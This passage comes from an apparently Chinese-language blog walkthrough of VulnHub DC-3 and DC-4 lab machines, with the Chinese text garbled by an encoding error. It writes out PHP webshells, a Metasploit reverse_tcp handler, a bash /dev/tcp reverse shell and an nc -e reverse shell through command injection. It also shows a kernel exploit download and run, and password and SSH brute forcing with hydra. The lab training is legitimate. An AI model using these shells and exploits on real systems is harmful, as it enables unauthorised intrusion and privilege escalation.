<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20220903221340927.png" alt="image-20220903221340927"></p>
<p>çœ‹åˆ°<code>/*</code>ï¼Œçœ‹æ¥æ˜¯å¯ä»¥æˆåŠŸè®¿é—®</p>
<h5 id="msfåˆ©ç”¨æœ¨é©¬"><a href="#msfåˆ©ç”¨æœ¨é©¬" class="headerlink" title="msfåˆ©ç”¨æœ¨é©¬"></a>msfåˆ©ç”¨æœ¨é©¬</h5><p>ç„¶åç”¨<code>msf</code>è¿›è¡Œåˆ©ç”¨</p>
<blockquote>
<p>å…ˆè¾“å…¥<code>msfconsole</code>ï¼Œè¿›å…¥msf</p>
</blockquote>
<blockquote>
<p>ç„¶åè¾“å…¥<br><code>use exploit/multi/handler</code></p>
<p><code>set payload php/meterpreter/reverse_tcp</code><br>è¿›å…¥æˆ‘ä»¬åˆ©ç”¨msfåˆ¶ä½œçš„æœ¨é©¬åˆ©ç”¨ç¯å¢ƒ</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903220102252.png" alt="image-20220903220102252"></p>
<blockquote>
<p>è¾“å…¥<code>show options</code><br>çœ‹çœ‹éœ€è¦å¡«å†™ä»€ä¹ˆ</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903220250819.png" alt="image-20220903220250819"></p>
<p>çœ‹åˆ°LHOSTç›‘å¬çš„ipæ²¡æœ‰å¡«å†™</p>
<blockquote>
<p>è¾“å…¥<code>set LHOST 192.168.133.140</code>  &#x2F;&#x2F;kaliçš„ip</p>
</blockquote>
<blockquote>
<p>è¾“å…¥<code>run</code>ï¼Œè¿è¡Œ</p>
</blockquote>
<p>è¿™é‡Œå°±æ˜¯åœ¨ç­‰å¾…æˆ‘ä»¬çš„æœ¨é©¬è¿è¡Œï¼Œæˆ‘ä»¬åªéœ€è¦åˆ·æ–°ä¸€ä¸‹æˆ‘ä»¬ä¹‹å‰è®¿é—®æœ¨é©¬çš„ç½‘é¡µ</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20220903223440029.png" alt="image-20220903223440029"></p>
<p>ç„¶åè¾“å…¥</p>
<blockquote>
<p>è¾“å…¥<code>shell</code></p>
<p>ç„¶åè¾“å…¥<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>&#x2F;&#x2F;è¿›å…¥äº¤äº’å¼shellï¼Œå½“ç„¶ä¸å«Œçœ‹ç€éº»çƒ¦ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œåé¢å‘½ä»¤</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903223812256.png" alt="image-20220903223812256"></p>
<h5 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h5><blockquote>
<p>è¾“å…¥<code>ls</code>,ç®€å•çœ‹çœ‹æ–‡ä»¶</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903224116654.png" alt="image-20220903224116654"></p>
<blockquote>
<p>è¾“å…¥<code>uname -a</code><br>æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220904082811177.png" alt="image-20220904082811177"></p>
<p>çœ‹åˆ°<code>unbuntu</code>æ˜¯<code>2016</code>å¹´<code>4</code>æœˆå‘å¸ƒçš„ï¼Œæ‰€ä»¥æ˜¯<code>unbuntu16.04</code></p>
<p><code>linux</code>ç‰ˆæœ¬æ˜¯<code>4.4.0-21</code>ç‰ˆ</p>
<p>æ‰€ä»¥æ ¹æ®è¿™ä¸ªç‰ˆæœ¬çœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„æ¼æ´ï¼Œæ¥æ–¹ä¾¿æˆ‘ä»¬ææƒ</p>
<blockquote>
<p>è¿˜æ˜¯åˆ©ç”¨ä¹‹å‰ç”¨è¿‡çš„<br><code>searchsploit unbuntu 16.04</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220904093243588.png" alt="image-20220904093243588"></p>
<p><strong>double-fdput()</strong> ,è¿™æ˜¯è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå³å¯è·å–<code>root</code>æƒé™</p>
<p>æˆ‘ä»¬æŠŠå®ƒå†…å®¹æ˜¾ç¤ºå‡ºæ¥</p>
<blockquote>
<p>è¾“å…¥<code>searchsploit -p 39772</code>æ˜¾ç¤ºæ–‡æœ¬è·¯å¾„<br>   <code>cat /usr/share/exploitdb/exploits/linux/local/39772.txt</code> æ˜¾ç¤ºå†…å®¹</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220904093849189.png" alt="image-20220904093849189"></p>
<p>åœ¨æœ€åçœ‹åˆ°è¯¥æ¼æ´åˆ©ç”¨çš„<code>exp</code>ä¸‹è½½é“¾æ¥</p>
<p><img src="/post/vulnhub/image-20220904095521748.png" alt="image-20220904095521748"></p>
<p>ä¸‹è½½æœ€åä¸€ä¸ªé“¾æ¥çš„å‹ç¼©åŒ…</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/offensive-security/</span>exploitdb-bin-sploits<span class="regexp">/raw/m</span>aster<span class="regexp">/bin-sploits/</span><span class="number">39772</span>.zip</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨æˆ‘ä»¬çš„ç½‘ç«™åå°ä¸Šä¼ ä¸Šå»ï¼Œå’Œåˆ›å»ºæœ¨é©¬æ–‡ä»¶æ—¶å€™ä¸€æ ·</p>
<p><img src="/post/vulnhub/image-20220904101055473.png" alt="image-20220904101055473"></p>
<p>ç»“æœæŠ¥é”™äº†</p>
<p><img src="/post/vulnhub/image-20220904101159692.png" alt="image-20220904101159692"></p>
<p>çœ‹æ¥è¿™ä¸ªç½‘ç«™ä¸Šä¼ å¤„æ˜¯ä¸èƒ½ä¸Šä¼ å‹ç¼©åŒ…æ–‡ä»¶çš„</p>
<p>æ‰€ä»¥æˆ‘ä»¬åªèƒ½ç”¨å·¥å…·è¿›è¡Œç›´æ¥ä¸Šä¼ äº†ï¼Œæ¯”å¦‚èšå‰‘æˆ–è€…èœåˆ€ç­‰å·¥å…·</p>
<p>æˆ‘ä»¬å’Œä¹‹å‰ä¸€æ ·æ–°å»ºä¸€ä¸ª<code>php</code>æ–‡ä»¶å†™ä¸Šæˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬</p>
<p><img src="/post/vulnhub/image-20220904101711601.png" alt="image-20220904101711601"></p>
<p>ç”¨èšå‰‘è¿æ¥</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">123</span>.php</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20220904101700569.png" alt="image-20220904101700569"></p>
<p>ç„¶åæŠŠæˆ‘ä»¬çš„å‹ç¼©åŒ…æ”¾åœ¨ç›®å½•ä¸‹</p>
<p><img src="/post/vulnhub/image-20220904112832628.png" alt="image-20220904112832628"></p>
<p>ç„¶åè¿”å›<code>msf</code></p>
<blockquote>
<p>è¾“å…¥<code>ls</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220904112929091.png" alt="image-20220904112929091"></p>
<p>å‘ç°å‹ç¼©åŒ…å·²ç»åœ¨é‡Œé¢äº†</p>
<p>ç„¶åè§£å‹ç¼©</p>
<blockquote>
<p>è¾“å…¥<code>unzip 39772.zip</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220904113114803.png" alt="image-20220904113114803"></p>
<p>å‘ç°ç›®å½•ä¸‹å¤šäº†ä¸ª<code>39772</code>çš„ç›®å½•</p>
<blockquote>
<p>è¾“å…¥<code>cd 39772</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220904113213562.png" alt="image-20220904113213562"></p>
<p>å‘ç°æœ‰ä¸¤ä¸ªå‹ç¼©åŒ…ï¼Œæˆ‘ä»¬åˆ©ç”¨<code>exploit.tar</code></p>
<blockquote>
<p>è¾“å…¥<code>tar -xvf exploit.tar</code> &#x2F;&#x2F;è§£å‹ç¼©</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220904113439714.png" alt="image-20220904113439714"></p>
<p>å‘ç°å¤šäº†ä¸ª<code>ebpf_mapfd_doubleput_exploit</code>ç›®å½•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20220904113541560.png" alt="image-20220904113541560"></p>
<p>å‘ç°æœ‰ä¸ª<code>compile.sh</code></p>
<p>è¿è¡Œ</p>
<blockquote>
<p>è¾“å…¥<code>./compile.sh</code></p>
</blockquote>
<p>å‘ç°ç›®å½•ä¸‹æœ‰å¤šäº†ä¸€ä¸ª<code>doubleput</code></p>
<p><img src="/post/vulnhub/image-20220904113730537.png" alt="image-20220904113730537"></p>
<p>è¿™å°±æ˜¯ææƒæ–‡ä»¶ï¼Œè¿è¡Œä¸€ä¸‹</p>
<blockquote>
<p>è¾“å…¥<code>./doupleput</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220904114028987.png" alt="image-20220904114028987"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">whoami</span>ï¼Œçœ‹çœ‹ææƒæˆåŠŸæ²¡</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20220904114119370.png" alt="image-20220904114119370"></p>
<p>ææƒæˆåŠŸ</p>
<p>ç„¶åæˆ‘ä»¬åˆ°<code>/root</code>ç›®å½•ä¸‹æŸ¥çœ‹ <code>flag</code></p>
<p><img src="/post/vulnhub/image-20220904114212223.png" alt="image-20220904114212223"></p>
<hr>
<blockquote>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">\ \      / /__|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \  ___  _ __   ___</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line"> \ \ /\ / / _ \ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">  \ V  V /  __/ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_</span>|</span><br><span class="line">   \_/\_/ \___|<span class="string">_</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">____/ \___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___(_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_)</span></span><br></pre></td></tr></table></figure>

<p><code>Congratulations are in order.  :-)</code></p>
<p><code>I hope you&#39;ve enjoyed this challenge as I enjoyed making it.</code></p>
<p><code>If there are any ways that I can improve these little challenges,</code><br><code>please let me know.</code></p>
<p><code>As per usual, comments and complaints can be sent via Twitter to @DCAU7</code></p>
<p><code>Have a great day!!!!</code></p>
<p>æ„æ€æ˜¯ï¼š</p>
<p>æ­å–œä½ ï¼Œä¸€åˆ‡æ­£å¸¸ã€‚ï¼š-ï¼‰</p>
<p>æˆ‘å¸Œæœ›ä½ å’Œæˆ‘ä¸€æ ·å–œæ¬¢è¿™ä¸ªæŒ‘æˆ˜ã€‚</p>
<p>å¦‚æœæœ‰ä»»ä½•æ–¹æ³•å¯ä»¥æ”¹å–„è¿™äº›å°æŒ‘æˆ˜ï¼Œ</p>
<p>è¯·è®©æˆ‘çŸ¥é“ã€‚</p>
<p>å¦‚å¾€å¸¸ä¸€æ ·ï¼Œè¯„è®ºå’ŒæŠ•è¯‰å¯ä»¥é€šè¿‡Twitterå‘é€åˆ°@DCAU7</p>
<p>ç¥ä½ æœ‰ç¾å¥½çš„ä¸€å¤©ï¼ï¼ï¼ï¼</p>
</blockquote>
<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<h3 id="æ³•2"><a href="#æ³•2" class="headerlink" title="æ³•2"></a>æ³•2</h3><h4 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a><strong>åå¼¹shell</strong></h4><blockquote>
<p>åå¼¹shellï¼Œå°±æ˜¯æ§åˆ¶ç«¯ç›‘å¬åœ¨æŸTCP&#x2F;UDPç«¯å£ï¼Œè¢«æ§ç«¯å‘èµ·è¯·æ±‚åˆ°è¯¥ç«¯å£ï¼Œå¹¶å°†å…¶å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ§åˆ¶ç«¯ã€‚</p>
<p>é€šä¿—ç‚¹è¯´ï¼Œåå¼¹shellå°±æ˜¯ä¸€ç§åå‘é“¾æ¥ï¼Œä¸æ­£å‘çš„sshç­‰ä¸åŒï¼Œå®ƒæ˜¯åœ¨å¯¹æ–¹ç”µè„‘æ‰§è¡Œå‘½ä»¤è¿æ¥åˆ°æˆ‘æ–¹çš„æ”»å‡»æ¨¡å¼ï¼Œå¹¶ä¸”è¿™ç§æ”»å‡»æ¨¡å¼å¿…é¡»æ­é…è¿œç¨‹æ‰§è¡Œå‘½ä»¤æ¼æ´æ¥ä½¿ç”¨ã€‚</p>
<p>ç”±äºé˜²ç«å¢™ç­‰é™åˆ¶ï¼Œå¯¹æ–¹æœºå™¨åªèƒ½å‘é€è¯·æ±‚ï¼Œä¸èƒ½æ¥æ”¶è¯·æ±‚</p>
<p>å¯¹äºç—…æ¯’ï¼Œæœ¨é©¬ï¼Œå—å®³è€…ä»€ä¹ˆæ—¶å€™èƒ½ä¸­æ‹›ï¼Œå¯¹æ–¹çš„ç½‘ç»œç¯å¢ƒæ˜¯ä»€ä¹ˆæ ·çš„ï¼Œä»€ä¹ˆæ—¶å€™å¼€å…³æœºï¼Œéƒ½æ˜¯æœªçŸ¥ï¼Œå»ºç«‹ä¸€ä¸ªæœåŠ¡ç«¯ï¼Œè®©æ¶æ„ç¨‹åºä¸»åŠ¨è¿æ¥ï¼Œæ‰æ˜¯ä¸Šç­–ã€‚</p>
</blockquote>
<p>å’Œæ³•ä¸€ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦å†™ä¸€ä¸ªåå¼¹<code>shell</code>çš„<code>php</code>æ–‡ä»¶</p>
<blockquote>
<p><code>&lt;?php system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.133.140/8888 0&gt;&amp;1&#39;&quot;);?&gt;</code></p>
<p>&#x2F;&#x2F;æ³¨æ„è¿™é‡Œçš„ipä¸ºkaliçš„ipï¼Œ8888ä¸ºç›‘å¬çš„ç«¯å£</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220904115013063.png" alt="image-20220904115013063"></p>
<blockquote>
<p>è¾“å…¥<code>nc -lnvp 8888</code>å¼€å§‹ç›‘å¬<br>ç„¶åè®¿é—®<code>456.php</code><br><code>http://192.168.133.139/templates/protostar/456.php</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220904130847588.png" alt="image-20220904130847588"></p>
<p>æ‹¿åˆ°<code>shell</code>ï¼Œåé¢ææƒå’Œæ³•ä¸€</p>
<p>ä¸€æ ·</p>
<h3 id="æ³•3"><a href="#æ³•3" class="headerlink" title="æ³•3"></a>æ³•3</h3><h4 id="weevelyã€ææƒæ²¡å›æ˜¾ã€‘"><a href="#weevelyã€ææƒæ²¡å›æ˜¾ã€‘" class="headerlink" title="weevelyã€ææƒæ²¡å›æ˜¾ã€‘"></a><strong>weevely</strong>ã€ææƒæ²¡å›æ˜¾ã€‘</h4><blockquote>
<p><code>Weevely</code>æ˜¯ä¸€æ¬¾ä½¿ç”¨pythonç¼–å†™çš„webshellå·¥å…·,é›†webshellç”Ÿæˆå’Œè¿æ¥äºä¸€èº«,é‡‡ç”¨c&#x2F;sæ¨¡å¼ æ„å»º,å¯ä»¥ç®—ä½œæ˜¯linuxä¸‹çš„ä¸€æ¬¾phpèœåˆ€æ›¿ä»£å·¥å…·</p>
</blockquote>
<p>ç”Ÿæˆ<code>Shell</code></p>
<blockquote>
<p><code>weevely generate  &lt;æ–‡ä»¶å&gt;</code></p>
<p><code>weevely generate 123456 shell.php</code></p>
</blockquote>
<p>æŠŠç”Ÿæˆçš„å†…å®¹ï¼Œå¤åˆ¶åˆ°æˆ‘ä»¬åˆ›å»ºçš„<code>789.php</code>æ–‡ä»¶é‡Œï¼Œå’Œå‰é¢ä¸¤ä¸ªæ–¹æ³•æ­¥éª¤ä¸€æ ·</p>
<p>åˆ©ç”¨è§¦å‘<code>shell</code></p>
<blockquote>
<p><code>weevely http://192.168.133.139/templates/protostar/789.php 123456</code></p>
<p><code>python -m http.server 9999</code>   </p>
</blockquote>
<p><img src="/post/vulnhub/image-20220904133118746.png" alt="image-20220904133118746"></p>
<p>æˆåŠŸè¿›å…¥<code>shell</code></p>
<p>ä½†æ˜¯å½“æ‰§è¡Œææƒæ—¶</p>
<p><img src="/post/vulnhub/image-20220904135935922.png" alt="image-20220904135935922"></p>
<p>æŠ¥é”™æ— æ³•ææƒï¼Œçœ‹æ¥æ˜¯è¢«è¿‡æ»¤å•¥çš„</p>
<hr>
<h1 id="å››ã€DC-4-åˆçº§"><a href="#å››ã€DC-4-åˆçº§" class="headerlink" title="å››ã€DC-4[åˆçº§]"></a>å››ã€DC-4[åˆçº§]</h1><p><strong>only one flag</strong></p>
<h2 id="ä¿¡æ¯æ”¶é›†-3"><a href="#ä¿¡æ¯æ”¶é›†-3" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å…ˆçœ‹çœ‹é¶æœºç«¯å£è¿è¡Œçš„æœåŠ¡</p>
<p><img src="/post/vulnhub/image-20220918190610478.png" alt="image-20220918190610478"></p>
<p>å‘ç°æœ‰<code>22</code>å’Œ<code>80</code>ç«¯å£ï¼Œåˆ†åˆ«è¿è¡Œ<code>ssh</code>å’Œ<code>http</code></p>
<p>æˆ‘ä»¬å…ˆè®¿é—®<code>80</code>ç«¯å£</p>
<blockquote>
<p>è®¿é—®ipï¼š<code>192.168.133.141</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220918190945726.png" alt="image-20220918190945726"></p>
<p>æ˜¯ä¸€ä¸ªåŸºæœ¬çš„ç™»å½•çª—å£ï¼Œæœ‰æç¤ºæ˜¯<code>admin</code>ç”¨æˆ·ç™»å½•ç•Œé¢ï¼Œæ‰€ä»¥<strong>å¯èƒ½éœ€è¦å¯†ç çˆ†ç ´ç™»å½•</strong></p>
<p>æˆ‘ä»¬å†åˆ©ç”¨<code>wappalyzer</code>çœ‹ä¸€ä¸‹ç½‘ç«™ä¸€äº›åŸºæœ¬ä¿¡æ¯</p>
<p><img src="/post/vulnhub/image-20220918194402321.png" alt="image-20220918194402321"></p>
<p>æ²¡æœ‰å•¥æœ‰ç”¨çš„ä¿¡æ¯</p>
<h2 id="å¯†ç çˆ†ç ´"><a href="#å¯†ç çˆ†ç ´" class="headerlink" title="å¯†ç çˆ†ç ´"></a>å¯†ç çˆ†ç ´</h2><p>ç„¶åæˆ‘ä»¬å°±å¼€å§‹è¿›è¡Œå¯†ç çˆ†ç ´</p>
<p>å·²çŸ¥ç”¨æˆ·åä¸º<code>admin</code>ï¼Œåªç”¨å¯¹å¯†ç çˆ†ç ´</p>
<p><img src="/post/vulnhub/image-20220918202233098.png" alt="image-20220918202233098"></p>
<p>ã€å­—å…¸å¯ä»¥è‡ªå·±æ‰¾ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥çœ‹æˆ‘å­¦ä¹ ç¬”è®°å†™çš„ç½‘ç«™ä¸‹è½½ã€‘</p>
<p>è¿™é‡Œæˆ‘ç”¨çš„<code>top2000.txt</code></p>
<p>æœ€åçˆ†ç ´å‡ºå¯†ç ä¸º<code>happy</code></p>
<p><img src="/post/vulnhub/image-20220918203225520.png" alt="image-20220918203225520"></p>
<p>ç™»å½•è¯•è¯•</p>
<p><img src="/post/vulnhub/image-20220918204147349.png" alt="image-20220918204147349"></p>
<p>ç™»å½•æˆåŠŸï¼Œè¿›å…¥<code>Command</code></p>
<p><img src="/post/vulnhub/image-20220918204230810.png" alt="image-20220918204230810"></p>
<p>ç‚¹å‡»<code>run</code>ï¼Œå°±ä¼šæ˜¾ç¤ºä¸Šé¢çš„æ•°æ®ï¼Œçœ‹æ¥æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯å®ƒé»˜è®¤æ˜¯<code>ls -l</code>ï¼Œæˆ‘ä»¬è¯•è¯•æŠ“åŒ…èƒ½ä¿®æ”¹è¯·æ±‚åŒ…é‡Œçš„å‘½ä»¤å—</p>
<p><img src="/post/vulnhub/image-20220918204413877.png" alt="image-20220918204413877"></p>
<p>å‘ç°æ˜¯å¯ä»¥ä¿®æ”¹çš„ï¼Œæˆ‘ä»¬è¯•è¯•<code>whoami</code>å‘½ä»¤ï¼Œçœ‹çœ‹å½“å‰ç½‘ç«™ç™»å½•ç”¨æˆ·æƒé™</p>
<blockquote>
<p>è¾“å…¥<code>whoami</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220918204514149.png" alt="image-20220918204514149"></p>
<p>å‘ç°æ˜¯æ™®é€šç”¨æˆ·æƒé™</p>
<p>ä¸‹é¢æ˜¯ä¸¤ä¸ª<code>getshell</code>çš„æ€è·¯</p>
<hr>
<p><strong>1.</strong></p>
<p>åç»­æŸ¥è¯¢æ“ä½œï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥åˆ©ç”¨<code>nc</code><strong>åå¼¹shell</strong>ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥æ‰¾åˆ°ç”¨æˆ·ç›®å½•ä¿¡æ¯</p>
<blockquote>
<p>ç»ˆç«¯è¾“å…¥<code>nc -l -vv -p 8888</code>ï¼Œç›‘å¬8888ç«¯å£</p>
</blockquote>
<p>æŠ“åŒ…æ•°æ®å‘½ä»¤ä¿®æ”¹ä¸º</p>
<blockquote>
<p><code>nc -nv 192.168.133.140 8888 -e /bin/bash</code>   &#x2F;&#x2F;<code>192.168.133.140</code>æ˜¯è™šæ‹Ÿæœºipï¼Œä¸æ˜¯é¶æœºip</p>
</blockquote>
<p>ç„¶åç»ˆç«¯å°±å¯ä»¥æ‰§è¡Œåç»­æ‰§è¡Œå‘½ä»¤çš„ç±»ä¼¼æ“ä½œï¼Œå°±æ˜¯æ‰§è¡Œçš„æ—¶å€™å¯èƒ½ç¨å¾®æ–¹ä¾¿ä¸€äº›</p>
<hr>
<p><strong>2.</strong></p>
<p>æˆ‘ä»¬ä¿®æ”¹å‘½ä»¤ï¼ŒæŸ¥è¯¢<code>/etc/passwd</code>æ–‡æ¡£ï¼ˆè®°å½•æ¯ä¸ªç”¨æˆ·çš„ä¿¡æ¯ï¼Œæ–¹ä¾¿ç®¡ç†å‘˜å¯¹ç”¨æˆ·çš„ç®¡ç†çš„ä¸€ä¸ªæ–‡æ¡£ï¼‰</p>
<blockquote>
<p>è¾“å…¥<code>cat+/etc/passwd</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220918205535912.png" alt="image-20220918205535912"></p>
<p>å‘ç°æœ‰ä¸‰ä¸ªç”¨æˆ·</p>
<blockquote>
<p><code>charles</code><br><code>jim</code><br><code>sam</code></p>
</blockquote>
<p>æˆ‘ä»¬æŸ¥çœ‹è¿™å‡ ä¸ªç”¨æˆ·çš„ç›®å½•ä¸‹æœ‰æ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯</p>
<p>å…ˆè®¿é—®<code>charles</code></p>
<blockquote>
<p>è¾“å…¥<code>ls+-a+/home/charles</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220918211049263.png" alt="image-20220918211049263"></p>
<p>æ„Ÿè§‰æ²¡å•¥æœ‰ç”¨çš„ä¿¡æ¯</p>
<p>å†çœ‹çœ‹<code>jim</code></p>
<blockquote>
<p>è¾“å…¥<code>ls+-a+/home/jim</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220918211159526.png" alt="image-20220918211159526"></p>
<p>å‘ç°å…³é”®ä¿¡æ¯ï¼Œ <code>backups</code>ç›®å½•å’Œ<code>mbox</code>ç›®å½•ï¼Œ<code>test.sh</code>é‡Œé¢æˆ‘çœ‹äº†ï¼Œæ²¡å•¥æœ‰ç”¨çš„ä¿¡æ¯</p>
<p>å…ˆçœ‹<code>backups</code>ç›®å½•</p>
<blockquote>
<p>è¾“å…¥<code>ls+-a+/home/jim/backups</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220918211855793.png" alt="image-20220918211855793"></p>
<p>å‘ç°æœ‰ä¸ª<code>old-passwords.bak</code>ï¼Œè¿™ä¸ªå¯èƒ½å°±æ˜¯ç™»å½•è¿™ä¸‰ä¸ªç”¨æˆ·çš„å…³é”®</p>
<p>æŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p>
<blockquote>
<p>è¾“å…¥<code>cat+/home/jim/old-passwords.bak</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220918212107439.png" alt="image-20220918212107439"></p>
<p>å‘ç°æ˜¯ä¸€ä¸ªå¯†ç è¡¨ï¼Œå¤åˆ¶åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå½“ä½œçˆ†ç ´çš„å¯†ç è¡¨</p>
<h2 id="hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´"><a href="#hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´" class="headerlink" title="hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´"></a>hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´</h2><p>æˆ‘ä»¬å·²ç»æœ‰äº†å¯†ç è¡¨<code>ï¼ˆpd.txtï¼‰</code>,æˆ‘ä»¬å†æŠŠä¸‰ä¸ªç”¨æˆ·åå†™åˆ°å¦ä¸€ä¸ªæ–‡æ¡£é‡Œ<code>ï¼ˆun.txtï¼‰</code></p>
<p>å› ä¸ºä¹‹å‰æˆ‘ä»¬æ‰«æçŸ¥é“ï¼Œ<code>22</code>ç«¯å£è¿è¡Œç€<code>ssh</code>ï¼Œè€Œ<code>80</code>ç«¯å£æˆ‘ä»¬å·²ç»è®¿é—®äº†ï¼Œæ‰€ä»¥ä¸‹é¢ç«¯å£å†™<code>22</code></p>
<p>äºæ˜¯</p>
<blockquote>
<p>è¾“å…¥<code>hydra -L un.txt -P pd.txt 192.168.133.141 ssh -s 22</code></p>
</blockquote>
<p>æœ‰ç‚¹ä¹…ï¼Œç­‰ä¸€ä¼šå°±è¡Œ</p>
<p><img src="/post/vulnhub/image-20220918214254623.png" alt="image-20220918214254623"></p>
<p>å¾—åˆ°<code>jim</code>ç”¨æˆ·çš„å¯†ç </p>
<blockquote>
<p><code>jibril04</code></p>
</blockquote>
<p>ç„¶åæˆ‘ä»¬ç™»å½•<code>ssh</code></p>
<blockquote>
<p>è¾“å…¥<code>ssh jim@192.168.133.141 -p 22</code></p>
</blockquote>
<p>ç„¶åè¾“å…¥å¯†ç åï¼Œç™»å½•æˆåŠŸ</p>
<p><img src="/post/vulnhub/image-20220918214519470.png" alt="image-20220918214519470"></p>
<p>æˆ‘ä»¬å…ˆçœ‹çœ‹æˆ‘ä»¬èƒ½å¦æ‰§è¡Œä¸€äº›ç®¡ç†å‘˜å‘½ä»¤</p>
<blockquote>
<p>è¾“å…¥<code>sudo -l</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220918215754640.png" alt="image-20220918215754640"></p>
<p>å‘ç°<code>jim</code>ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä»»ä½•ç®¡ç†å‘˜å‘½ä»¤ï¼Œæ‰€ä»¥ä¸å¯èƒ½åœ¨<code>jim</code>ç”¨æˆ·ä¸Šè¿›è¡Œææƒæˆ–å…¶ä»–åç»­æ“ä½œ</p>
<p>æˆ‘ä»¬ä»”ç»†ä¸€äº›å¯ä»¥çœ‹åˆ°</p>
<p><img src="/post/vulnhub/image-20220918214603182.png" alt="image-20220918214603182"></p>
<p>è¯´æˆ‘ä»¬æœ‰ä¸€å°é‚®ä»¶ï¼Œé‚£æˆ‘ä»¬å°±çœ‹çœ‹è¿™å°ç”¨é‚®ä»¶æ˜¯ä»€ä¹ˆ</p>
<p>ä½†æˆ‘ä»¬ä¸çŸ¥é“<code>mail</code>åœ¨å“ªé‡Œ</p>
<blockquote>
<p>è¾“å…¥<code>find / -name mail</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220918215012745.png" alt="image-20220918215012745"></p>
<p>æ‰¾åˆ°ä½ç½®<code>/var/mail</code></p>
<blockquote>
<p>è¾“å…¥<code>cd /var/mail;ls -a</code></p>
</blockquote>
